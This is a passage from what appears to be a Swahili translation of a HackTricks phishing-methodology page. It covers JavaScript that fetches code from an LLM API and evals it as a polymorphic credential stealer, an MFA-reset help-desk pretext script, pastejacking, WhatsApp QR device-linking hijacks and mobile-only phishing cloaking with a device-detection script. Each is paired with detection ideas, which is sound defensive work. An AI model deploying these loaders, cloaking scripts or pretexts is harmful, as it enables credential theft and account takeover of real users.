2. **Client-side API call:** wakati wa load, JS huita public LLM (Gemini/DeepSeek/etc.) au CDN proxy; ni prompt/API call pekee iliyo kwenye static HTML.
3. **Assemble & exec:** concat response na kui-execute (polymorphic kwa kila visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code huibinafsisha lure (mfano, uchanganuzi wa LogoKit token) na kutuma creds kwenye prompt-hidden endpoint.

**Evasion traits**
- Traffic hupitia LLM domains zinazojulikana au CDN proxies zinazoaminika; wakati mwingine kupitia WebSockets kwenda backend.
- Hakuna static payload; malicious JS huwepo tu baada ya render.
- Non-deterministic generations huzalisha **unique** stealers kwa kila session.

**Detection ideas**
- Endesha sandboxes zikiwa na JS enabled; tambua **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Tafuta front-end POSTs kwenda LLM APIs zinazofuatwa mara moja na `eval`/`Function` kwenye text iliyorejeshwa.
- Toa alert kuhusu LLM domains zisizoidhinishwa kwenye client traffic pamoja na credential POSTs zinazofuata.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Mbali na classic push-bombing, operators huanzisha tu **MFA registration mpya** wakati wa help-desk call, na hivyo kubatilisha token iliyokuwepo ya user. Login prompt yoyote inayofuata huonekana kuwa halali kwa victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Fuatilia matukio ya AzureAD/AWS/Okta ambapo **`deleteMFA` + `addMFA`** hutokea **ndani ya dakika chache kutoka kwa IP ileile**.



## Utekaji wa Clipboard / Pastejacking

Washambuliaji wanaweza kunakili kimya kimya commands hasidi kwenye clipboard ya mwathiriwa kutoka kwenye web page iliyoathiriwa au yenye jina linalofanana kimakosa, kisha kumdanganya mtumiaji azipaste ndani ya **Win + R**, **Win + X** au dirisha la terminal, na kutekeleza code kiholela bila download au attachment yoyote.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing ya Simu na Usambazaji wa App Hasidi (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Utekaji wa kuunganisha kifaa cha WhatsApp kupitia social engineering ya QR
* Ukurasa wa lure (kwa mfano, “channel” bandia ya ministry/CERT) huonyesha QR ya WhatsApp Web/Desktop na kumwelekeza mwathiriwa aiscan, na kumwongeza mshambuliaji kimya kimya kama **linked device**.<sup>[[12]](#references)</sup>
* Mshambuliaji hupata mara moja mwonekano wa chats/contacts hadi session iondolewe. Waathiriwa wanaweza baadaye kuona notification ya “new device linked”; defenders wanaweza kutafuta matukio yasiyotarajiwa ya ku-link device muda mfupi baada ya kutembelea QR pages zisizoaminika.

### Phishing inayowalenga watumiaji wa simu ili kukwepa crawlers/sandboxes
Waendeshaji wanaweka phishing flows zao nyuma ya ukaguzi rahisi wa kifaa ili desktop crawlers zisifike kwenye pages za mwisho. Muundo wa kawaida ni script ndogo inayojaribu kama DOM ina uwezo wa touch na kutuma matokeo kwenye server endpoint; clients zisizo za mobile hupokea HTTP 500 (au page tupu), huku watumiaji wa mobile wakipewa flow kamili.<sup>[[7]](#references)</sup>

Minimal client snippet (mantiki ya kawaida):
```html
<script src="/static/detect_device.js"></script>
```
Mantiki ya `detect_device.js` (iliyorahisishwa):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Tabia ya server inayozingatiwa mara nyingi:
- Huweka session cookie wakati wa load ya kwanza.
- Hukubali `POST /detect {"is_mobile":true|false}`.
- Hurejesha 500 (au placeholder) kwa GET zinazofuata wakati `is_mobile=false`; huhudumia phishing ikiwa tu `true`.

Heuristics za hunting na detection:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: mfuatano wa `GET /static/detect_device.js` → `POST /detect` → HTTP 500 kwa non‑mobile; njia halali za mwathiriwa wa mobile hurejesha 200 pamoja na HTML/JS inayofuata.
- Zuia au chunguza kwa makini pages zinazoweka masharti ya content pekee kupitia `ontouchstart` au device checks zinazofanana.

Vidokezo vya defence:
- Endesha crawlers zikiwa na mobile-like fingerprints na JS ikiwa enabled ili kufichua content iliyofichwa.
- Toa alert kwa responses za 500 zinazotiliwa shaka zinazofuata `POST /detect` kwenye domains zilizosajiliwa hivi karibuni.

## References

- [1] [Kutengeneza Domain Variations Zinazotumiwa katika Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Kutafuta Phishing: Tools na Techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Kuiba Credentials na Kubypass 2FA kwa Kutumia noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Kuiba Sessions na Kubypass 2FA kwa EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Jinsi ya Kusakinisha na Kusanidi DKIM pamoja na Postfix kwenye Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Ripoti ya Global Incident Response ya Unit 42 ya 2025 – Toleo la Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile-gated phishing infra na heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Frontier Inayofuata ya Runtime Assembly Attacks: Kutumia LLMs Kutengeneza Phishing JavaScript kwa Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking, na TDS: Ndani ya Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Kuhijack Traffic ya Microsoft windows.com kwa Bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: Fake Dating App Iliyotumiwa kama Chambo katika Targeted Spyware Campaign nchini Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoCs na Samples za ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
